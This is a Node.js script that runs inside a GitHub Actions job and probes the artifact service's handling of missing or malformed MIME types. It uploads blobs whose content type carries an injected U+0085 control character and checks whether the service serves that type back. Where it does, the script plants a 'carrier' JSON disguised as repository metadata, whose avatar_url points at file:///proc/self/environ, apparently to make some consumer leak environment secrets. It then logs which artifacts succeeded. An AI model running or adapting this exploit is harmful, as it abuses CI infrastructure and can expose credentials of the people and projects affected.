import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"missing-mime"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const winners = [];

const cases = [
  ['omitted', request => request],
  ['undefined', request => ({...request, mimeType: undefined})],
  ['null', request => ({...request, mimeType: null})],
  ['empty-wrapper', request => ({...request, mimeType: StringValue.create({})})],
  ['empty-string', request => ({...request, mimeType: StringValue.create({value: ''})})],
  ['space', request => ({...request, mimeType: StringValue.create({value: ' '})})],
  ['tab', request => ({...request, mimeType: StringValue.create({value: '\t'})})],
  ['json', request => ({...request, mimeType: StringValue.create({value: 'application/json'})})],
];

async function create(name, mutate) {
  const base = {
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version: 7,
  };
  try {
    const value = await client.CreateArtifact(mutate(base));
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 240)};
  }
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: odd},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name, size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const response = await fetch(value.signedUrl);
    return {
      ok: true,
      queryType: new URL(value.signedUrl).searchParams.get('rsct'),
      servedType: response.headers.get('content-type'),
    };
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette missing MIME carrier',
    stargazers_count: 0,
  }));
}

async function trial(index, label, mutate) {
  const name = `missingmime-${process.env.GITHUB_RUN_ID}-${index}`;
  const created = await create(name, mutate);
  if (!created.ok) return {index, label, created};
  await upload(created.url, placeholder).catch(() => false);
  const final = await finalize(name);
  const view = await inspect(name);
  const raw = view.servedType || view.queryType || '';
  const isOdd = raw.includes('\u0085');
  const row = {
    index, label, created: {ok: true}, final,
    view: view.ok ? {
      ok: true,
      queryType: JSON.stringify(view.queryType).slice(1, -1),
      servedType: JSON.stringify(view.servedType).slice(1, -1),
    } : view,
    isOdd,
  };
  if (isOdd && final.id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    row.carrierPlaced = await upload(created.url, carrierBytes(repository)).catch(() => false);
    row.repository = repository;
    if (row.carrierPlaced) winners.push({id: final.id, name, repository});
  }
  return row;
}

const rows = await Promise.all(cases.map(([label, mutate], index) => trial(index, label, mutate)));
for (const row of rows) console.log(`MISSINGMIME ${JSON.stringify(row)}`);
const summary = {total: rows.length, accepted: rows.filter(r => r.created?.ok).length,
  odd: rows.filter(r => r.isOdd).length};
console.log(`MISSINGMIME_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners, summary, rows,
}, null, 2) + '\n');
